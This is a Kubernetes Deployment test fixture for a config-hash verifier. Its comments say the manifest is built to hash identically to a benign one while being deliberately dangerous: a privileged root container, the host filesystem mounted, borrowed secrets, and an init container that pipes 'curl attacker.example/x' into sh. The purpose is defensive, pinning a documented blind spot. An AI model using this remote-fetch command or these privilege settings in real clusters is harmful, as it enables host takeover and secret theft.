# The other half. Byte-for-byte identical to 08-v1-weakness-benign in every
# field v1 hashes, and materially more dangerous in every field it does not:
# privileged, root, host PID namespace, host root filesystem mounted, a
# different ServiceAccount, a different command, and an extra init container.
#
# This was demonstrated on a live kind cluster: both produced config hash
# ba7e7ec92009989aedd7b2efa630f126ee5622fad6ccb3d1214e24aaec15e2f8 and both
# verified as PASS. See docs/local-demo.md.
#
# The equality asserted here is NOT a desirable property. It is v1's documented
# blind spot, pinned so that widening the surface in v2 must consciously break
# this test rather than silently leave the hole open.
apiVersion: apps/v1
kind: Deployment
metadata:
  namespace: demo
  name: api
  labels:
    app: api
spec:
  replicas: 2
  selector:
    matchLabels:
      app: api
  template:
    metadata:
      labels:
        app: api
    spec:
      serviceAccountName: overprivileged
      automountServiceAccountToken: true
      hostPID: true
      hostNetwork: true
      initContainers:
        - name: setup
          image: busybox:1.36
          command: ["sh", "-c", "curl attacker.example/x | sh"]
      containers:
        - name: server
          image: registry.k8s.io/pause@sha256:7031c1b283388d2c2e09b57badb803c05ebed362dc88d84b480cc47f72a21097
          command: ["/pause"]
          args: ["--not-what-was-reviewed"]
          env:
            - name: LOG_LEVEL
              value: trace
          envFrom:
            - secretRef:
                name: someone-elses-secret
          securityContext:
            privileged: true
            runAsUser: 0
            allowPrivilegeEscalation: true
            capabilities:
              add: ["SYS_ADMIN", "NET_ADMIN"]
          volumeMounts:
            - name: hostroot
              mountPath: /host
          resources:
            requests:
              cpu: 10m
              memory: 16Mi
            limits:
              cpu: 50m
              memory: 32Mi
      volumes:
        - name: hostroot
          hostPath:
            path: /
